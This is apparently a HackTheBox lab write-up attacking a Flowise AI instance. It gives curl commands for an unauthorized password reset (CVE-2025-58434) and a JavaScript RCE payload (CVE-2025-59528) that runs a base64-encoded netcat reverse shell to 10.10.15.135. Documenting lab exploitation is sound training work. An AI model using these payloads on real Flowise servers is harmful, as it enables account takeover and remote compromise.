# HackTheBox Silentium Full Chain Penetration Testing

## External Reconnaissance and Service Identification
- Vhost enumeration, revealed `staging.silentium.htb` leading to the `Flowise Ai` login panel
- Valid user identification via web common enumeration
## CVE-2025-58434 Exploitation and Initial Access
    curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password  -H "Content-Type: application/json" -d '{"user": {"email": "ben@silentium.htb"}}'
## API returned TempToken, used for later unauthorized password reset
    curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
    -H "Content-Type: application/json" \
    -d '{
      "user": {
        "email": "ben@silentium.htb",
        "tempToken": "[TOKEN]",
        "password": "Qwerty12345."
      }
    }
## (RCE) CVE-2025-59528 executed as intended.
- Previously prepared Sleep Test injection resulted in delayed server response, proving it as vulnerable, which allowed for further exploitation.

## Reverse shell execution
- Executing reverse shell via /bin/sh resulted in connection with api endpoint with root priviledges inside Docker container.
    `
    curl -v -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
      -d @payload.json
    `
    

## payload.json content
- File containing reverse shell encoded in base64 to reduce Node interpreter troubles
    `
    {
      "loadMethod": "listActions",
      "inputs": {
        "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo -n     'bWtmaWZvIC90bXAvZjsgbmMgMTAuMTAuMTUuMTM1IDgwIDA8L3RtcC9mIHwgc2ggLWkgMj4mMSB8IHRlZSAvdG1wL2Y=' |base64 -d |sh\");return 1;})()})"
      }
    }
    `
